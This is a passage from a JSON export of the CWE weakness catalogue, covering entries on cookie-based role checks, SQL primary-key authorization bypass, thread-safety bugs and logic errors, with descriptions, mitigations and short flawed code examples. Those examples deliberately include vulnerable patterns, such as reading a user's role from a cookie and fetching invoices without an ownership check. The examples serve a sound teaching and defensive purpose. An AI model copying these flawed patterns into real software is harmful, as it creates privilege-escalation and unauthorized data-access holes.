      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Avoid using cookie data for a security-related decision."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Add integrity checks to detect tampering."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-61",
          "Entries": [
            {
              "IntroText": "The following code excerpt reads a value from a browser cookie to determine the role of the user."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"role\")) {\n\t\t\tuserRole = c.getValue();\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "It is easy for an attacker to modify the \"role\" value found in the locally stored cookie, allowing privilege escalation."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-5784",
          "Description": "e-dating application allows admin privileges by setting the admin cookie to 1.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5784"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP29",
          "EntryName": "Faulty endpoint authentication"
        }
      ],
      "RelatedAttackPatterns": [
        "226",
        "31",
        "39"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This problem can be primary to many types of weaknesses in web applications. A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks.."
        }
      ]
    },
    {
      "ID": "566",
      "Name": "Authorization Bypass Through User-Controlled SQL Primary Key",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.",
      "ExtendedDescription": "\n\nWhen a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.\n\n\nDatabase access control errors occur when:\n\n\n  - Data enters a program from an untrusted source.\n\n  - The data is used to specify the value of a primary key in a SQL query.\n\n  - The untrusted source does not have the permissions to be able to access all rows in the associated table.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "639",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Technology",
          "Name": "Database Server",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Access Control"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data",
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an \"accept known good\" validation strategy."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-195",
          "Entries": [
            {
              "IntroText": "The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user."
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\t...\n\t conn = new SqlConnection(_ConnectionString);\n\t conn.Open();\n\t int16 id = System.Convert.ToInt16(invoiceID.Text);\n\t SqlCommand query = new SqlCommand( \"SELECT * FROM invoices WHERE id = @id\", conn);\n\t query.Parameters.AddWithValue(\"@id\", id);\n\t SqlDataReader objReader = objCommand.ExecuteReader();\n\t ... \n```"
            },
            {
              "BodyText": "The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP25",
          "EntryName": "Tainted input to variable"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "567",
      "Name": "Unsynchronized Access to Shared Data in a Multithreaded Context",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.",
      "ExtendedDescription": "\n\nWithin servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. This is a typical programming mistake in J2EE applications, since the multithreading is handled by the framework. When a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable.\n\n\nNote that this weakness is not unique to servlets.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "820",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "488",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data",
            "DoS: Instability",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the shared variable contains sensitive data, it may be manipulated or displayed in another user session. If this data is used to control the application, its value can be manipulated to cause the application to crash or perform poorly."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Remove the use of static variables used between servlets. If this cannot be avoided, use synchronized access for these variables."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code implements a basic counter for how many times the page has been accesed."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic static class Counter extends HttpServlet {\n\t\tstatic int count = 0;\n\t\tprotected void doGet(HttpServletRequest in, HttpServletResponse out)\n\t\tthrows ServletException, IOException {\n\t\t\tout.setContentType(\"text/plain\");\n\t\t\tPrintWriter p = out.getWriter();\n\t\t\tcount++;\n\t\t\tp.println(count + \" hits so far!\");\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Consider when two separate threads, Thread A and Thread B, concurrently handle two different requests:"
            },
            {
              "BodyText": "- Assume this is the first occurrence of doGet, so the value of count is 0.\n\n  - doGet() is called within Thread A.\n\n  - The execution of doGet() in Thread A continues to the point AFTER the value of the count variable is read, then incremented, but BEFORE it is saved back to count. At this stage, the incremented value is 1, but the value of count is 0.\n\n  - doGet() is called within Thread B, and due to a higher thread priority, Thread B progresses to the point where the count variable is accessed (where it is still 0), incremented, and saved. After the save, count is 1.\n\n  - Thread A continues. It saves the intermediate, incremented value to the count variable - but the incremented value is 1, so count is \"re-saved\" to 1."
            },
            {
              "BodyText": "At this point, both Thread A and Thread B print that one hit has been seen, even though two separate requests have been processed. The value of count should be 2, not 1."
            },
            {
              "BodyText": "While this example does not have any real serious implications, if the shared variable in question is used for resource tracking, then resource consumption could occur. Other scenarios exist."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "VNA00-J",
          "EntryName": "Ensure visibility when accessing shared primitive variables"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "VNA02-J",
          "EntryName": "Ensure that compound operations on shared variables are atomic"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP19",
          "EntryName": "Missing Lock"
        }
      ],
      "RelatedAttackPatterns": [
        "25"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "568",
      "Name": "finalize() Method Without super.finalize()",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains a finalize() method that does not call super.finalize().",
      "ExtendedDescription": "The Java Language Specification states that it is a good practice for a finalize() method to call super.finalize().",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "459",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Call the super.finalize() method."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use static analysis tools to spot such issues in your code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following method omits the call to super.finalize()."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprotected void finalize() {\n\t\tdiscardNative();\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET12-J",
          "EntryName": "Do not use finalizers"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "570",
      "Name": "Expression is Always False",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains an expression that will always evaluate to false.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "561",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use Static Analysis tools to spot such conditions."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the updateUserAccountOrder() method used within an e-business product ordering/inventory application will validate the product number that was ordered and the user account number. If they are valid, the method will update the product inventory, the user account, and the user order appropriately."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void updateUserAccountOrder(String productNumber, String accountNumber) {\n\t\t\tboolean isValidProduct = false;\n\t\t\tboolean isValidAccount = false;\n\t\t\tif (validProductNumber(productNumber)) {\n\t\t\t\tisValidProduct = true;\n\t\t\t\tupdateInventory(productNumber);\n\t\t\t}\n\t\t\telse {\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (validAccountNumber(accountNumber)) {\n\t\t\t\tisValidProduct = true;\n\t\t\t\tupdateAccount(accountNumber, productNumber);\n\t\t\t}\n\t\t\tif (isValidProduct && isValidAccount) {\n\t\t\t\tupdateAccountOrder(accountNumber, productNumber);\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "However, the method never sets the isValidAccount variable after initializing it to false so the isValidProduct is mistakenly used twice. The result is that the expression \"isValidProduct && isValidAccount\" will always evaluate to false, so the updateAccountOrder() method will never be invoked. This will create serious problems with the product ordering application since the user account and inventory databases will be updated but the order will not be updated."
            },
            {
              "BodyText": "This can be easily corrected by updating the appropriate variable."
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\t...\n\tif (validAccountNumber(accountNumber)) {\n\t\tisValidAccount = true;\n\t\tupdateAccount(accountNumber, productNumber);\n\t}\n\t...\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following example, the hasReadWriteAccess method uses bit masks and bit operators to determine if a user has read and write privileges for a particular process. The variable mask is defined as a bit mask from the BIT_READ and BIT_WRITE constants that have been defined. The variable mask is used within the predicate of the hasReadWriteAccess method to determine if the userMask input parameter has the read and write bits set."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define BIT_READ 0x0001 // 00000001\n\t#define BIT_WRITE 0x0010 // 00010000\n\tunsigned int mask = BIT_READ & BIT_WRITE; /* intended to use \"|\" */\n\t// using \"&\", mask = 00000000\n\t// using \"|\", mask = 00010001\n\t// determine if user has read and write access\n\tint hasReadWriteAccess(unsigned int userMask) {\n\t\t\t// if the userMask has read and write bits set\n\t\t\t// then return 1 (true)\n\t\t\tif (userMask & mask) {\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t// otherwise return 0 (false)\n\t\t\treturn 0;\n\t}\n```"
            },
            {
              "BodyText": "However the bit operator used to initialize the mask variable is the AND operator rather than the intended OR operator (CWE-480), this resulted in the variable mask being set to 0. As a result, the if statement will always evaluate to false and never get executed."
            },
            {
              "BodyText": "The use of bit masks, bit operators and bitwise operations on variables can be difficult. If possible, try to use frameworks or libraries that provide appropriate functionality and abstract the implementation."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following example, the updateInventory method used within an e-business inventory application will update the inventory for a particular product. This method includes an if statement with an expression that will always evaluate to false. This is a common practice in C/C++ to introduce debugging statements quickly by simply changing the expression to evaluate to true and then removing those debugging statements by changing expression to evaluate to false. This is also a common practice for disabling features no longer needed."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint updateInventory(char* productNumber, int numberOfItems) {\n\t\t\tint initCount = getProductCount(productNumber);\n\t\t\tint updatedCount = initCount + numberOfItems;\n\t\t\tint updated = updateProductCount(updatedCount);\n\t\t\t// if statement for debugging purposes only\n\t\t\tif (1 == 0) {\n\t\t\t\t\tchar productName[128];\n\t\t\t\t\tproductName = getProductName(productNumber);\n\t\t\t\t\tprintf(\"product %s initially has %d items in inventory \\n\", productName, initCount);\n\t\t\t\t\tprintf(\"adding %d items to inventory for %s \\n\", numberOfItems, productName);\n\t\t\t\t\tif (updated == 0) {\n\t\t\t\t\t\tprintf(\"Inventory updated for product %s to %d items \\n\", productName, updatedCount);\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tprintf(\"Inventory not updated for product: %s \\n\", productName);\n\t\t\t\t\t}\n\t\t\t}\n\t\t\treturn updated;\n\t}\n```"
            },
            {
              "BodyText": "Using this practice for introducing debugging statements or disabling features creates dead code that can cause problems during code maintenance and potentially introduce vulnerabilities. To avoid using expressions that evaluate to false for debugging purposes a logging API or debugging API should be used for the output of debugging messages."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC00-C",
          "EntryName": "Compile cleanly at high warning levels"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "571",
      "Name": "Expression is Always True",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains an expression that will always evaluate to true.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "561",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use Static Analysis tools to spot such conditions."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the updateInventory() method used within an e-business product ordering/inventory application will check if the input product number is in the store or in the warehouse. If the product is found, the method will update the store or warehouse database as well as the aggregate product database. If the product is not found, the method intends to do some special processing without updating any database."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void updateInventory(String productNumber) {\n\t\t\tboolean isProductAvailable = false;\n\t\t\tboolean isDelayed = false;\n\t\t\tif (productInStore(productNumber)) {\n\t\t\t\tisProductAvailable = true;\n\t\t\t\tupdateInStoreDatabase(productNumber);\n\t\t\t}\n\t\t\telse if (productInWarehouse(productNumber)) {\n\t\t\t\tisProductAvailable = true;\n\t\t\t\tupdateInWarehouseDatabase(productNumber);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tisProductAvailable = true;\n\t\t\t}\n\t\t\tif ( isProductAvailable ) {\n\t\t\t\tupdateProductDatabase(productNumber);\n\t\t\t}\n\t\t\telse if ( isDelayed ) {\n```\n/* Warn customer about delay before order processing */* \n\t\t\t\t\t...}}"
            },
            {
              "BodyText": "However, the method never sets the isDelayed variable and instead will always update the isProductAvailable variable to true. The result is that the predicate testing the isProductAvailable boolean will always evaluate to true and therefore always update the product database. Further, since the isDelayed variable is initialized to false and never changed, the expression always evaluates to false and the customer will never be warned of a delay on their product."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC00-C",
          "EntryName": "Compile cleanly at high warning levels"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "572",
      "Name": "Call to Thread run() instead of start()",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.",
      "ExtendedDescription": "In most cases a direct call to a Thread object's run() method is a bug. The programmer intended to begin a new thread of control, but accidentally called run() instead of start(), so the run() method will execute in the caller's thread of control.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "821",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use the start() method instead of the run() method."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following excerpt from a Java program mistakenly calls run() instead of start()."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tThread thr = new Thread() {\n\t\tpublic void run() {\n\t\t\t...\n\t\t}\n\t};\n\tthr.run();\n```"
            }
          ]
        }
      ],
      "AffectedResources": [
        "System Process"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "THI00-J",
          "EntryName": "Do not invoke Thread.run()"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "573",
      "Name": "Improper Following of Specification by Caller",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.",
      "ExtendedDescription": "When leveraging external functionality, such as an API, it is important that the caller does so in accordance with the requirements of the external functionality or else unintended behaviors may result, possibly leaving the system vulnerable to any number of exploits.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-7140",
          "Description": "Crypto implementation removes padding when it shouldn't, allowing forged signatures",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7140"
        },
        {
          "Reference": "CVE-2006-4339",
          "Description": "Crypto implementation removes padding when it shouldn't, allowing forged signatures",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4339"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET10-J",
          "EntryName": "Follow the general contract when implementing the compareTo() method"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "574",
      "Name": "EJB Bad Practices: Use of Synchronization Primitives",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product violates the Enterprise JavaBeans (EJB) specification by using thread synchronization primitives.",
      "ExtendedDescription": "The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: \"An enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances.\" The specification justifies this requirement in the following way: \"This rule is required to ensure consistent runtime semantics because while some EJB containers may use a single JVM to execute all enterprise bean's instances, others may distribute the instances across multiple JVMs.\"",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "695",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "821",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not use Synchronization Primitives when writing EJBs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example a Customer Entity EJB provides access to customer information in a database for a business application."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
